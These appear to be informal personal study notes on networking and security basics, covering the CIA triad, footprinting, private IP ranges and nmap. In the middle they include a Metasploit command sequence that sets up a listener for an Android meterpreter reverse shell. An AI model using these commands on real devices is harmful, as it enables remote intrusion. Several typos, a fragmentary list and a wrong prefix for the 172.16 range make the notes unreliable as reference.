==========================================Networking & security==========================================
>>>There is always a trade of between security and functionality of the system...and decided by how much do we need each one of them

>>>The CIA traid - fundamental security principle
C - confedentially - only to authorized people
I - integrity - maintained by hashing/encryption, auditing
A - availability - availability to authorized user when they need it
protecting the C, I and A of data & services

>>>Authentication(+vely identified user...ex.username/password) v/s Authorization(allow to perform action after authenticated...implemented
using rights, priviledges, permissions,etc)

>>>Attack vectors
1.Network-based
2.Host-based
DOS(Denial Of Service) attacks attempts to deny the use of computer systems and their data from their authorized user...DOS are for 
data corruption or for damaging the computer system 

>>Defense concepts --> "Defence in depth" startegy is the best..it's about defending the every component of network or system and it covers
every part of system or network
Three types of controls are involved
1.Administrative control - defined by mgmt
2.Technical or logical controls - firewalls, Intrusion detection systems,etc
3.Physical controls

Threat uses the vulnerabilities to diminish the system security and expose it...exposure is the vilneability that has been exploited
Mitigations

>>Security patches

>>Footprinting -> info gathering
types
1.open source/passive info gathering
2.active info gathering
3.Anonymous footprinting
4.pseudonymous footprinting

after DNS info you should gather the network related info...

10.0.0.0-10.255.255.255 (10/8 prefix) - for private network
172.16.0.0-172.31.255.255 (172.16/8 prefix)
192.168.0.0-192.168.255.255 (192.168/16 prefix)

OS footprinting - nmap
open ports will give you bunch of info

>>nmap/zenmap -- basically to gather the info...Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, 
what services (application name and version) those hosts are offering, 
what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.
-need to careful while doing the intense scans...coz system administrator can easily know

1.Quid pro quo

4.pretexting
5.diversion theft

2.msfconsole
msf  > use multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.0.110
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit

port forwarding...of the routers...advantages vs disadvantages

=============================================Basics of networking=============================================
1.modem is ur first device which connects to the internet/cloud (cloud is internet only)...then comes the router...then comes the firewall...then comes switches...then lastly your computer

2.Physical vs logical connectivity of machines - two comp which seems connected to the same switch via cable may not be able to connected to each other...coz logically they may be on the different network (as in switch can split them)
